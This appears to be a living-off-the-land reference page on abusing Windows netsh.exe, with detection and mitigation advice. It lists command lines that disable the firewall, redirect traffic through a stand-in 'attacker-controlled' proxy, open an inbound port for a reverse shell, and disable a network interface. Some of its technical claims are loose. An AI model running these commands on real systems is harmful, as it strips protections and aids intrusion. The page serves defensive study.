# netsh.exe
## What is it?
*```netsh.exe``` (Network Shell) is a **built-in Windows command-line utility** used for configuring and managing network interfaces, firewall settings, and various network-related tasks on Windows operating systems. It allows users to query, modify, and configure system network settings from the command prompt.*

*As a trusted system tool, it is often overlooked by security software, which makes it a valuable tool for attackers looking to hide their activities or bypass network-based defenses.*

## Legitimate Usage
- **Configure Network Interfaces** → Use ```netsh``` to configure network adapters, IP addresses, DNS servers, and more.
- **Manage Windows Firewall** → Control firewall settings, including enabling/disabling rules, and managing inbound/outbound traffic.
- **Network Diagnostics** → Perform diagnostic tasks like checking network connectivity or flushing DNS.
- **Configure Routing** → Set up routing for network traffic between different subnets or devices.

## How to abuse it
- **Evasion via Trusted Utility** → Attackers can use ```netsh.exe``` to make network configuration changes that evade detection by security tools, such as disabling firewall rules or changing IP configurations.
- **Disabling Network Monitoring** → By modifying or disabling network traffic monitoring tools or firewall settings, attackers can ensure that their activities are not detected.
- **Lateral Movement** → Attackers can use ```netsh.exe``` to configure network interfaces or routing, facilitating lateral movement across the network.
- **Persistence** → Attackers can make persistent changes to network configurations, ensuring continued access to compromised systems.

## Example attacks
### 1. Disabling Windows Firewall for Evasion
*Attackers can use ```netsh.exe``` to disable the firewall, ensuring that no alerts are triggered by malicious network activity.*

**Disable Windows Firewall**

```
netsh advfirewall set allprofiles state off
```

**Effect:**
- Disables the **Windows Firewall** for all profiles, allowing unrestricted network traffic.

### 2. Modify Proxy Settings for Data Exfiltration
*```netsh.exe``` can be used to change proxy settings, redirecting network traffic through an attacker-controlled server for data exfiltration or command and control (C2) communication.*

**Change Proxy Settings**

```
netsh winhttp set proxy proxy.example.com:8080
```

**Effect:**
- Redirects traffic to an attacker-controlled proxy, allowing them to intercept sensitive data or send commands to the target system.

### 3. Lateral Movement via IP Configuration Changes
*Attackers may use ```netsh.exe``` to modify network interfaces or routing tables, enabling them to move laterally across the network.*

**Change IP Address for Lateral Movement**

```
netsh interface ip set address name="Ethernet" static 192.168.1.100 255.255.255.0
```

**Effect:**
- Changes the IP address of the network interface, enabling lateral movement and potentially evading detection by IP-based security controls.

### 4. Manipulating Firewall Rules to Allow Malicious Traffic
*Attackers can use ```netsh.exe``` to add custom firewall rules, allowing inbound or outbound traffic that would otherwise be blocked.*

**Allow Inbound Traffic on Port 8080**

```
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=8080
```

**Effect:**
- Opens port 8080 on the firewall, allowing an attacker to establish a reverse shell or communication channel over this port.

### 5. Disabling Network Monitoring for Stealth
*```netsh.exe``` can be used to disable network monitoring tools like Windows Defender or disable the monitoring of network connections, making it harder to detect suspicious activity.*

**Disable Network Monitoring**

```
netsh interface set interface "Ethernet" disable
```

**Effect:**
- Disables the **Ethernet interface**, preventing monitoring or analysis of network traffic on that interface.

# Detection & Mitigation
## Detection Methods
**Monitor ```netsh.exe``` Executions**
- **Event ID 4688 (Process Creation)** → Monitor the creation of ```netsh.exe``` processes, especially if they are executed with suspicious arguments or by non-administrative users.
- **Behavioral Analysis** → Look for unusual network configuration changes or firewall modifications that could indicate an attack.

**Monitor Network Traffic**
- **Event ID 5156 (Windows Filtering Platform)** → Detect changes in network filtering and firewall rules that could indicate malicious network activity.
- **Network Traffic Analysis** → Monitor outbound traffic for unexpected destinations or unusual proxy settings that may be used for exfiltration or C2 communication.

**Monitor Scheduled Tasks**
- **Event ID 4698 (Scheduled Task Created)** → Track the creation of scheduled tasks that invoke ```netsh.exe``` for persistent network changes.

## Mitigation Strategies
- **Restrict Access to ```netsh.exe```** → Use application whitelisting tools (such as AppLocker or WDAC) to restrict access to ```netsh.exe``` for non-administrative users.
- **Monitor Firewall and Network Changes** → Regularly review firewall settings and network configurations for unauthorized changes, especially those related to inbound or outbound rules.
- **Implement Network Segmentation** → Use network segmentation to isolate critical systems, making it more difficult for attackers to move laterally across the network.
- **Use Endpoint Detection and Response (EDR)** → Monitor for suspicious network configuration changes that could indicate malicious intent.
